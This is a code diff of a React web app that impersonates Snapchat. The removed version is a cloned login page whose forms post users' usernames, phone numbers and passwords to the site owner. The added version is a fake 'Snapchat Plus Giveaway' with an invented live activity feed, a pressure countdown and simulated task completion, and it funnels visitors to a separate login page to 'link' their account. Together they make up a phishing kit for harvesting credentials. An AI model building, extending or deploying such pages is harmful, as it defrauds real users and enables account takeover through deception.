@@ -1,511 +1,547 @@
-import React, { useState } from "react";
-import chkopiLogo from "../../../attached_assets/snapchat_1785772849797.png";
+import React, { useEffect, useRef, useState } from "react";
+import LoginPage from "./LoginPage";
 
-const ChkopiGhost = () => (
-  <img
-    //src={chkopiLogo}
-    alt="chkopi logo"
-    width="76"
-    height="76"
-    className="mx-auto block h-[76px] w-[76px] object-contain"
-  />
-);
+// Snapchat-themed giveaway SPA
 
-const GoogleLogo = () => (
+const GhostMark = ({ size = 64 }: { size?: number }) => (
   <svg
-    width="20"
-    height="20"
+    width={size}
+    height={size}
     viewBox="0 0 24 24"
+    fill="none"
     xmlns="http://www.w3.org/2000/svg"
   >
     <path
-      d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
-      fill="#4285F4"
+      d="M12 2C8.13 2 5 5.13 5 9v6c0 2.76 2.24 5 5 5h2c2.76 0 5-2.24 5-5V9c0-3.87-3.13-7-7-7z"
+      fill="#FFFC00"
+      stroke="#000"
+      strokeWidth="0.5"
     />
-    <path
-      d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
-      fill="#34A853"
-    />
-    <path
-      d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
-      fill="#FBBC05"
-    />
-    <path
-      d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
-      fill="#EA4335"
-    />
+    <circle cx="9" cy="10" r="1.2" fill="#000" />
+    <circle cx="15" cy="10" r="1.2" fill="#000" />
   </svg>
 );
 
-const EyeIcon = ({ open }: { open: boolean }) =>
-  open ? (
-    <svg
-      width="20"
-      height="20"
-      viewBox="0 0 24 24"
-      fill="none"
-      stroke="#888"
-      strokeWidth="2"
-      strokeLinecap="round"
-      strokeLinejoin="round"
-    >
-      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
-      <circle cx="12" cy="12" r="3" />
-    </svg>
-  ) : (
-    <svg
-      width="20"
-      height="20"
-      viewBox="0 0 24 24"
-      fill="none"
-      stroke="#888"
-      strokeWidth="2"
-      strokeLinecap="round"
-      strokeLinejoin="round"
-    >
-      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
-      <line x1="1" y1="1" x2="23" y2="23" />
-    </svg>
-  );
+type Task = {
+  id: string;
+  title: string;
+  meta: string;
+  required?: boolean;
+  url?: string;
+};
 
-// Step types
-type Step = "username" | "phone" | "password";
+const tasksSeed: Task[] = [
+  {
+    id: "t1",
+    title: "Download Pixel Push & reach Level 10",
+    meta: "~3 mins • Required",
+    required: true,
+    url: "https://play.google.com/store/search?q=Pixel%20Push&c=apps",
+  },
+  {
+    id: "t2",
+    title: "Install Spark Skate and open once",
+    meta: "~2 mins • Optional",
+    url: "https://play.google.com/store/search?q=Spark%20Skate&c=apps",
+  },
+];
 
-const Footer = () => (
-  <footer className="mt-10 w-full max-w-[900px] px-2">
-    <div className="grid grid-cols-2 sm:grid-cols-4 gap-x-6 gap-y-6">
-      <div className="flex flex-col gap-[6px]">
-        <a
-          href="#"
-          className="text-[13px] font-semibold text-[#333333] hover:underline"
-        >
-          Company
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Snap Inc.
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Careers
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          News
-        </a>
-      </div>
-      <div className="flex flex-col gap-[6px]">
-        <a
-          href="#"
-          className="text-[13px] font-semibold text-[#333333] hover:underline"
-        >
-          Community
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Support
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Community Guidelines
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Safety Center
-        </a>
-      </div>
-      <div className="flex flex-col gap-[6px]">
-        <a
-          href="#"
-          className="text-[13px] font-semibold text-[#333333] hover:underline"
-        >
-          Advertising
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Buy Ads
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Advertising Policies
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Political Ads Library
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Brand Guidelines
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Promotions Rules
-        </a>
-      </div>
-      <div className="flex flex-col gap-[6px]">
-        <a
-          href="#"
-          className="text-[13px] font-semibold text-[#333333] hover:underline"
-        >
-          Legal
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Privacy Center
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Your Privacy Choices
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Cookie Policy
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Report Infringement
-        </a>
-        <a href="#" className="text-[13px] text-[#555555] hover:underline">
-          Custom Creative Tools Terms
-        </a>
-      </div>
-    </div>
-    <div className="mt-6">
-      <a
-        href="#"
-        className="text-[13px] font-semibold text-[#333333] hover:underline"
-      >
-        Language
-      </a>
-    </div>
-  </footer>
-);
+function formatTime(s: number) {
+  const m = Math.floor(s / 60)
+    .toString()
+    .padStart(2, "0");
+  const sec = (s % 60).toString().padStart(2, "0");
+  return `${m}:${sec}`;
+}
 
-export default function App() {
-  const [step, setStep] = useState<Step>("username");
+function GiveawayPage() {
+  const [showModal, setShowModal] = useState(true);
   const [username, setUsername] = useState("");
-  const [phone, setPhone] = useState("");
-  const [countryCode, setCountryCode] = useState("+1");
-  const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
-  const [usernameError, setUsernameError] = useState("");
-  const [phoneError, setPhoneError] = useState("");
+  const usernameRef = useRef<HTMLInputElement | null>(null);
+  const [usernameValid, setUsernameValid] = useState(false);
+  const [tasks] = useState<Task[]>(tasksSeed);
+  const [completedTaskId, setCompletedTaskId] = useState<string | null>(null);
+  const [claimEnabled, setClaimEnabled] = useState(false);
+  const [claimed, setClaimed] = useState(false);
+  const [countdown, setCountdown] = useState(15 * 60); // 15:00
+  const [feed, setFeed] = useState<string[]>([]);
+  const feedRef = useRef<string[]>([]);
+  const [linked, setLinked] = useState(false);
 
-  const submitNetlifyForm = async (
-    formName: string,
-    fields: Record<string, string>,
-  ) => {
-    if (!import.meta.env.PROD) {
-      return;
+  useEffect(() => {
+    // a user who filled the login form has a stored username
+    let hasLinked = false;
+    try {
+      hasLinked = !!window.localStorage.getItem("snapchatLoginUsername");
+    } catch (e) {
+      // ignore
     }
+    setLinked(hasLinked);
+    // skip the auto-show modal for users who already linked their account
+    setShowModal(!hasLinked);
+  }, []);
 
-    const body = new URLSearchParams();
-    body.set("form-name", formName);
+  // Prefill username from query param if provided
+  useEffect(() => {
+    try {
+      const params = new URLSearchParams(window.location.search);
+      const u = params.get("username") || params.get("user");
+      if (u) {
+        setUsername(u);
+      } else {
+        const storedUsername = window.localStorage.getItem(
+          "snapchatLoginUsername",
+        );
+        if (storedUsername) {
+          setUsername(storedUsername);
+        }
+      }
+    } catch (e) {
+      // ignore
+    }
+  }, []);
 
-    Object.entries(fields).forEach(([key, value]) => {
-      body.set(key, value);
-    });
+  useEffect(() => {
+    // countdown
+    const t = setInterval(() => {
+      setCountdown((c) => (c > 0 ? c - 1 : 0));
+    }, 1000);
+    return () => clearInterval(t);
+  }, []);
 
-    await fetch("/", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
+  useEffect(() => {
+    // fake realtime activity feed
+    const names = [
+      "ali",
+      "mohamed",
+      "meriem",
+      "rayan",
+      "katia",
+      "sara",
+      "youssef",
+      "amina",
+      "omar",
+      "lina",
+    ];
+    const i = setInterval(
+      () => {
+        const n = names[Math.floor(Math.random() * names.length)];
+        const masked = `${n}${Math.random().toString(36).slice(2, 5)}***`;
+        const msg = `User ${masked} just claimed Snapchat Plus!`;
+        feedRef.current = [msg, ...feedRef.current].slice(0, 6);
+        setFeed([...feedRef.current]);
       },
-      body: body.toString(),
-    });
-  };
+      4500 + Math.random() * 3000,
+    );
+    return () => clearInterval(i);
+  }, []);
 
-  const handleUsernameNext = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!username.trim()) {
-      setUsernameError("Please enter your username or email.");
-      return;
+  useEffect(() => {
+    setClaimEnabled(!!usernameValid && !!completedTaskId);
+  }, [usernameValid, completedTaskId]);
+
+  // focus username input when modal closes
+  useEffect(() => {
+    if (!showModal && usernameRef.current) {
+      usernameRef.current.focus();
     }
-    setUsernameError("");
-    await submitNetlifyForm("chkopi-login-username", {
-      username,
-    });
-    setStep("password");
-  };
+  }, [showModal]);
 
-  const handlePhoneNext = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!phone.trim()) {
-      setPhoneError("Please enter your phone number.");
-      return;
+  // simple username validation (no password required)
+  useEffect(() => {
+    const ok = /^[a-zA-Z0-9._]{3,}$/.test(username.trim());
+    setUsernameValid(ok);
+  }, [username]);
+
+  const handleOpenTask = (task: Task) => {
+    // open the real store/task page and simulate completion after a short delay
+    if (task.url) {
+      window.open(task.url, "_blank", "noopener,noreferrer");
     }
-    setPhoneError("");
-    await submitNetlifyForm("chkopi-login-phone", {
-      countryCode,
-      phone,
-    });
-    setStep("password");
+    // mark task as completed after a short simulated delay
+    setTimeout(() => setCompletedTaskId(task.id), 1800);
   };
 
-  const handlePasswordNext = async (e: React.FormEvent) => {
+  const submitClaim = async (formName = "snapchat-plus-claim") => {
+    const payload = {
+      "form-name": formName,
+      username: username || "",
+      taskId: completedTaskId || "",
+    };
+
     if (import.meta.env.DEV) {
-      e.preventDefault();
-      // In local dev we keep the current UX instead of posting to Netlify.
-      alert("Login submitted! (This is a UI clone — no real authentication.)");
-      return;
+      console.log("[DEV] submitClaim", payload);
+      // simulate success
+      feedRef.current = [
+        `User @${username || "anon"} claimed Snapchat Plus!`,
+        ...feedRef.current,
+      ].slice(0, 6);
+      setFeed([...feedRef.current]);
+      setClaimed(true);
+      setClaimEnabled(false);
+      return true;
     }
 
-    await submitNetlifyForm("chkopi-login-password", {
-      identifier: username || phone,
-      password,
-    });
+    try {
+      const body = new URLSearchParams();
+      Object.entries(payload).forEach(([k, v]) => body.set(k, String(v)));
+
+      const res = await fetch("/", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: body.toString(),
+      });
+
+      if (res.ok) {
+        feedRef.current = [
+          `User @${username || "anon"} claimed Snapchat Plus!`,
+          ...feedRef.current,
+        ].slice(0, 6);
+        setFeed([...feedRef.current]);
+        setClaimed(true);
+        setClaimEnabled(false);
+        return true;
+      }
+    } catch (e) {
+      // ignore
+    }
+    return false;
   };
+
+  const handleClaim = async () => {
+    if (!claimEnabled) return;
+    const ok = await submitClaim();
+    if (ok) {
+      alert(
+        `Success! ${username || "Your account"} unlocked 1 Month Snapchat Plus.`,
+      );
+    } else {
+      alert("There was a problem claiming your reward. Please try again.");
+    }
+  };
+
+  const steps = [
+    { id: "login", label: "Link Account", done: linked || usernameValid },
+    { id: "task", label: "Complete Task", done: !!completedTaskId },
+    { id: "claim", label: "Claim Reward", done: claimed },
+  ];
+  const completedSteps = steps.filter((s) => s.done).length;
+  const progressPct = Math.round((completedSteps / steps.length) * 100);
+  const currentStepIndex = steps.findIndex((s) => !s.done);
 
   return (
-    <div
-      className="min-h-screen w-full font-sans text-[#111111]"
-      style={{ backgroundColor: "#f2f2f2" }}
-    >
-      <main className="flex flex-col items-center px-4 pt-10 pb-10">
-        {/* ── Step 1: Username / Email ─────────────────────────────── */}
-        {step === "username" && (
-          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
-            <ChkopiGhost />
-            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
-              Log in to chkopi
-            </h1>
-            <form onSubmit={handleUsernameNext} className="mt-6">
-              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
-                Username or Email
-              </label>
-              <input
-                type="text"
-                value={username}
-                onChange={(e) => {
-                  setUsername(e.target.value);
-                  setUsernameError("");
-                }}
-                className="w-full px-3.5 py-[12px] border-[2px] border-black rounded-[8px] focus:outline-none text-[15px]"
-                autoFocus
-              />
-              {usernameError && (
-                <p className="mt-1.5 text-[13px] text-red-500">
-                  {usernameError}
-                </p>
-              )}
-
-              <div className="mt-3 text-center">
-                <button
-                  type="button"
-                  onClick={() => {
-                    setStep("phone");
-                    setUsernameError("");
-                  }}
-                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
-                >
-                  Use phone number instead
-                </button>
-              </div>
-
-              <div className="mt-5 flex justify-center">
-                <button
-                  type="submit"
-                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
-                >
-                  Next
-                </button>
-              </div>
-
-              <div className="flex items-center w-full mt-6 mb-5">
-                <div className="flex-1 border-t border-[#e0e0e0]"></div>
-                <span className="px-4 text-[13px] text-[#888888]">OR</span>
-                <div className="flex-1 border-t border-[#e0e0e0]"></div>
-              </div>
-
-              <button
-                type="button"
-                className="flex items-center justify-center gap-2.5 w-full border border-[#d0d0d0] rounded-full py-[10px] bg-white hover:bg-gray-50 transition-colors"
-              >
-                <GoogleLogo />
-                <span className="text-[14px] font-semibold text-[#333333]">
-                  Continue with Google
-                </span>
-              </button>
-            </form>
+    <div className="min-h-screen bg-[#F7F7F7] flex items-center justify-center py-12 px-4">
+      <div className="w-full max-w-4xl">
+        {claimed && (
+          <div className="mb-4 p-3 rounded-lg bg-green-50 border border-green-200 text-green-800">
+            🎉 Claimed — reward linked to @{username || "your account"}
           </div>
         )}
+        {linked && (
+          <div className="mb-4 p-3 rounded-lg bg-green-50 border border-green-200 text-green-800">
+            ✅ Welcome back, @{username || "your account"}! Your account has
+            been linked successfully.
+          </div>
+        )}
+        {!linked && (
+          <div className="mb-4 flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-black/10 bg-white px-4 py-3 shadow-sm">
+            <div>
+              <div className="text-sm font-semibold text-black">
+                Log in to link your Snapchat account
+              </div>
+              <div className="text-xs text-gray-500">
+                After login, you’ll return here to finish the task and claim
+                the reward.
+              </div>
+            </div>
+            <button
+              type="button"
+              onClick={() => {
+                const returnTo = "/";
+                window.location.assign(
+                  `/login?returnTo=${encodeURIComponent(returnTo)}`,
+                );
+              }}
+              className="rounded-full bg-black px-4 py-2 text-sm font-semibold text-white transition hover:opacity-90"
+            >
+              Go to Login
+            </button>
+          </div>
+        )}
+        <header className="flex items-center gap-4 mb-6">
+          <div className="p-2 rounded-full shadow-sm bg-white inline-flex">
+            <GhostMark size={48} />
+          </div>
+          <div>
+            <h2 className="text-2xl font-bold">Snapchat Plus Giveaway</h2>
+            <p className="text-sm text-gray-600">
+              Claim a free 1-month trial — limited time
+            </p>
+          </div>
+          <div className="ml-auto text-sm font-medium text-gray-700">
+            Offer reserved for{" "}
+            <span className="font-bold">{formatTime(countdown)}</span>
+          </div>
+        </header>
 
-        {/* ── Step 2: Phone number ─────────────────────────────────── */}
-        {step === "phone" && (
-          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
-            <ChkopiGhost />
-            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
-              Log in to chkopi
-            </h1>
-            <form onSubmit={handlePhoneNext} className="mt-6">
-              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
-                Phone number
+        <main className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <section className="bg-white rounded-xl p-6 shadow-md">
+            <h3 className="text-xl font-semibold mb-3">Welcome</h3>
+            <p className="text-gray-600 mb-4">
+              Complete one quick task to claim your 1 Month Snapchat Plus
+              reward.
+            </p>
+
+            {/* <div className="mb-4">
+              <label className="text-sm font-medium text-gray-700">
+                Snapchat Username
               </label>
-              {/* Phone input with country selector */}
-              <div className="flex border-[2px] border-black rounded-[8px] overflow-hidden focus-within:border-black">
-                <div className="flex items-center gap-1.5 px-3 bg-white border-r border-[#e0e0e0] shrink-0">
-                  {/* US Flag emoji */}
-                  <span className="text-[16px]">🇺🇸</span>
-                  <select
-                    className="text-[14px] font-medium text-[#333] bg-transparent focus:outline-none appearance-none cursor-pointer pr-1"
-                    value={countryCode}
-                    onChange={(e) => setCountryCode(e.target.value)}
-                  >
-                    <option value="+1">US +1</option>
-                    <option value="+44">UK +44</option>
-                    <option value="+33">FR +33</option>
-                    <option value="+49">DE +49</option>
-                    <option value="+81">JP +81</option>
-                    <option value="+86">CN +86</option>
-                    <option value="+91">IN +91</option>
-                    <option value="+55">BR +55</option>
-                    <option value="+52">MX +52</option>
-                    <option value="+61">AU +61</option>
-                  </select>
-                  {/* Chevron */}
-                  <svg
-                    width="12"
-                    height="12"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="#888"
-                    strokeWidth="2.5"
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                  >
-                    <polyline points="6 9 12 15 18 9" />
-                  </svg>
-                </div>
+              <div className="mt-2 flex items-center gap-2">
                 <input
-                  type="tel"
-                  value={phone}
-                  onChange={(e) => {
-                    setPhone(e.target.value);
-                    setPhoneError("");
-                  }}
-                  className="flex-1 px-3 py-[12px] focus:outline-none text-[15px]"
-                  placeholder=""
-                  autoFocus
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  placeholder="e.g. cool.snap"
+                  className="flex-1 px-4 py-2 rounded-full border border-gray-200 focus:outline-none focus:ring-2 focus:ring-yellow-400 text-sm"
                 />
+                <div className="w-8 h-8 flex items-center justify-center">
+                  {usernameValid ? (
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                      <path
+                        d="M20 6L9 17l-5-5"
+                        stroke="#16a34a"
+                        strokeWidth="2.2"
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                      />
+                    </svg>
+                  ) : (
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                      <circle
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="#ddd"
+                        strokeWidth="1.5"
+                      />
+                    </svg>
+                  )}
+                </div>
               </div>
-              {phoneError && (
-                <p className="mt-1.5 text-[13px] text-red-500">{phoneError}</p>
-              )}
+              <p className="text-xs text-gray-500 mt-1">No password required</p>
+            </div> */}
 
-              <div className="mt-3 text-center">
-                <button
-                  type="button"
-                  onClick={() => {
-                    setStep("username");
-                    setPhoneError("");
-                  }}
-                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
-                >
-                  Use username or email address instead
-                </button>
+            <div className="mb-4">
+              <h4 className="font-medium mb-2">Available Tasks</h4>
+              <div className="space-y-3">
+                {tasks.map((t) => (
+                  <div
+                    key={t.id}
+                    className={`p-3 rounded-lg border ${completedTaskId === t.id ? "border-yellow-400 bg-yellow-50" : "border-gray-100 hover:shadow-lg"} transition-all cursor-pointer`}
+                    onClick={() => handleOpenTask(t)}
+                    role="button"
+                    tabIndex={0}
+                  >
+                    <div className="flex items-center justify-between">
+                      <div>
+                        <div className="font-semibold">{t.title}</div>
+                        <div className="text-xs text-gray-500">{t.meta}</div>
+                      </div>
+                      <div
+                        className="text-xs px-3 py-1 rounded-full text-white"
+                        style={{ background: t.required ? "#111" : "#6b7280" }}
+                      >
+                        {t.required ? "Required" : "Optional"}
+                      </div>
+                    </div>
+                  </div>
+                ))}
               </div>
-
-              <div className="mt-5 flex justify-center">
-                <button
-                  type="submit"
-                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
-                >
-                  Next
-                </button>
-              </div>
-
-              <div className="flex items-center w-full mt-6 mb-5">
-                <div className="flex-1 border-t border-[#e0e0e0]"></div>
-                <span className="px-4 text-[13px] text-[#888888]">OR</span>
-                <div className="flex-1 border-t border-[#e0e0e0]"></div>
-              </div>
-
-              <button
-                type="button"
-                className="flex items-center justify-center gap-2.5 w-full border border-[#d0d0d0] rounded-full py-[10px] bg-white hover:bg-gray-50 transition-colors"
-              >
-                <GoogleLogo />
-                <span className="text-[14px] font-semibold text-[#333333]">
-                  Continue with Google
-                </span>
-              </button>
-            </form>
-          </div>
-        )}
-
-        {/* ── Step 3: Password ─────────────────────────────────────── */}
-        {step === "password" && (
-          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
-            <ChkopiGhost />
-            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
-              Enter Password
-            </h1>
-
-            {/* Show entered identifier with "Not you?" */}
-            <div className="mt-4 flex items-center justify-center gap-2">
-              <span className="text-[14px] font-semibold text-[#333]">
-                {username || phone}
-              </span>
-              <button
-                type="button"
-                onClick={() => {
-                  setStep(username ? "username" : "phone");
-                  setPassword("");
-                }}
-                className="text-[13px] font-semibold text-[#00C8FA] hover:underline"
-              >
-                Not you?
-              </button>
             </div>
 
-            <form
-              name="chkopi-login-password"
-              method="POST"
-              data-netlify="true"
-              onSubmit={handlePasswordNext}
-              className="mt-5"
-            >
-              <input
-                type="hidden"
-                name="form-name"
-                value="chkopi-login-password"
-              />
-              <input
-                type="hidden"
-                name="identifier"
-                value={username || phone}
-              />
-              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
-                Password
-              </label>
-              <div className="relative">
-                <input
-                  type={showPassword ? "text" : "password"}
-                  name="password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  className="w-full px-3.5 py-[12px] pr-11 border-[1.5px] border-[#cccccc] rounded-[8px] focus:outline-none focus:border-black text-[15px] transition-colors"
-                />
-                <a
-                  href="#"
-                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
-                >
-                  Forgot Password
-                </a>
+            <div className="mt-4">
+              <div className="mb-3 flex items-center justify-between">
+                <div className="text-sm font-semibold">Your Progress</div>
+                <div className="text-xs font-medium text-gray-500">
+                  {completedSteps} of {steps.length} steps
+                </div>
               </div>
 
-              <div className="mt-5 flex justify-center">
+              <div className="w-full bg-gray-200 h-2.5 rounded-full overflow-hidden">
+                <div
+                  className="h-2.5 bg-yellow-400 rounded-full transition-all duration-500"
+                  style={{ width: `${progressPct}%` }}
+                />
+              </div>
+
+              <div className="mt-5 flex items-start">
+                {steps.map((s, i) => (
+                  <React.Fragment key={s.id}>
+                    {i > 0 && (
+                      <div
+                        className={`mt-4 flex-1 h-0.5 rounded-full ${steps[i - 1].done ? "bg-green-500" : "bg-gray-200"}`}
+                      />
+                    )}
+                    <div className="flex flex-col items-center">
+                      <div
+                        className={`flex h-8 w-8 items-center justify-center rounded-full border-2 text-xs font-bold transition-all ${
+                          s.done
+                            ? "border-green-500 bg-green-500 text-white"
+                            : i === currentStepIndex
+                              ? "border-yellow-400 bg-yellow-400 text-black"
+                              : "border-gray-300 bg-white text-gray-400"
+                        }`}
+                      >
+                        {s.done ? (
+                          <svg
+                            width="14"
+                            height="14"
+                            viewBox="0 0 24 24"
+                            fill="none"
+                          >
+                            <path
+                              d="M20 6L9 17l-5-5"
+                              stroke="currentColor"
+                              strokeWidth="3"
+                              strokeLinecap="round"
+                              strokeLinejoin="round"
+                            />
+                          </svg>
+                        ) : (
+                          i + 1
+                        )}
+                      </div>
+                      <div className="mt-1.5 w-20 text-center">
+                        <div
+                          className={`text-xs font-semibold ${
+                            s.done
+                              ? "text-green-600"
+                              : i === currentStepIndex
+                                ? "text-black"
+                                : "text-gray-400"
+                          }`}
+                        >
+                          {s.label}
+                        </div>
+                        <div className="text-[10px] text-gray-400">
+                          {s.done
+                            ? "Completed"
+                            : i === currentStepIndex
+                              ? "In progress"
+                              : "Pending"}
+                        </div>
+                      </div>
+                    </div>
+                  </React.Fragment>
+                ))}
+              </div>
+
+              <button
+                onClick={handleClaim}
+                disabled={!claimEnabled}
+                className={`mt-5 w-full px-4 py-2 rounded-full font-semibold transition ${claimEnabled ? "bg-black text-white hover:opacity-90" : "bg-gray-200 text-gray-500 cursor-not-allowed"}`}
+              >
+                Claim Snapchat Plus
+              </button>
+            </div>
+          </section>
+
+          <aside className="space-y-4">
+            <div className="bg-white rounded-xl p-4 shadow-md">
+              <h4 className="font-semibold mb-2">Live Activity</h4>
+              <div className="text-sm text-gray-700 space-y-2 h-28 overflow-hidden">
+                {feed.length === 0 ? (
+                  <div className="text-gray-400">No recent activity</div>
+                ) : (
+                  feed.map((f, i) => (
+                    <div key={i} className="text-xs text-gray-600">
+                      {f}
+                    </div>
+                  ))
+                )}
+              </div>
+            </div>
+
+            <div className="bg-white rounded-xl p-4 shadow-md">
+              <h4 className="font-semibold mb-2">FAQ</h4>
+              <div className="space-y-2">
+                <details className="p-2 rounded-md bg-gray-50">
+                  <summary className="font-medium cursor-pointer">
+                    How does this giveaway work?
+                  </summary>
+                  <p className="text-sm text-gray-600 mt-2">
+                    Complete one quick app task and confirm your username to
+                    receive a 1-month Snapchat Plus reward.
+                  </p>
+                </details>
+                <details className="p-2 rounded-md bg-gray-50">
+                  <summary className="font-medium cursor-pointer">
+                    Is this free?
+                  </summary>
+                  <p className="text-sm text-gray-600 mt-2">
+                    Yes — the reward is a free trial. No credit card required
+                    here.
+                  </p>
+                </details>
+                <details className="p-2 rounded-md bg-gray-50">
+                  <summary className="font-medium cursor-pointer">
+                    How long is the offer held?
+                  </summary>
+                  <p className="text-sm text-gray-600 mt-2">
+                    The offer is reserved for the countdown shown. It may expire
+                    if time runs out.
+                  </p>
+                </details>
+              </div>
+            </div>
+
+            <div className="bg-white rounded-xl p-4 shadow-md text-center">
+              <div className="text-sm text-gray-500">Need help?</div>
+              <a
+                href="#"
+                className="mt-2 inline-block px-4 py-2 rounded-full bg-yellow-400 text-black font-semibold"
+              >
+                Contact Support
+              </a>
+            </div>
+          </aside>
+        </main>
+
+        {/* Modal */}
+        {showModal && (
+          <div className="fixed inset-0 flex items-center justify-center z-50">
+            <div
+              className="absolute inset-0 bg-black/30"
+              onClick={() => setShowModal(false)}
+            />
+            <div className="relative bg-white rounded-2xl p-6 max-w-md w-full shadow-2xl">
+              <div className="flex flex-col items-center gap-4">
+                <GhostMark size={72} />
+                <h3 className="text-xl font-bold">🎉 Congratulations!</h3>
+                <p className="text-gray-600 text-center">
+                  You've unlocked 1 Month of Snapchat Plus! To claim your gift,
+                  login to your account and complete 1 quick task below.
+                </p>
                 <button
-                  type="submit"
-                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
+                  onClick={() => {
+                    const returnTo = "/";
+                    window.location.assign(
+                      `/login?returnTo=${encodeURIComponent(returnTo)}`,
+                    );
+                  }}
+                  className="mt-2 px-6 py-2 rounded-full bg-black text-white font-semibold"
                 >
-                  Next
+                  Login to claim
                 </button>
               </div>
-            </form>
+            </div>
           </div>
         )}
-
-        {/* Sign up — shown on username & phone steps only */}
-        {step !== "password" && (
-          <div className="mt-5 text-center">
-            <span className="text-[15px] text-[#444444]">New to chkopi? </span>
-            <a
-              href="#"
-              className="text-[15px] font-bold text-black hover:underline"
-            >
-              Sign Up
-            </a>
-          </div>
-        )}
-
-        <Footer />
-      </main>
+      </div>
     </div>
   );
+}
+
+export default function App() {
+  const isLoginRoute = window.location.pathname.startsWith("/login");
+  return isLoginRoute ? <LoginPage /> : <GiveawayPage />;
 }
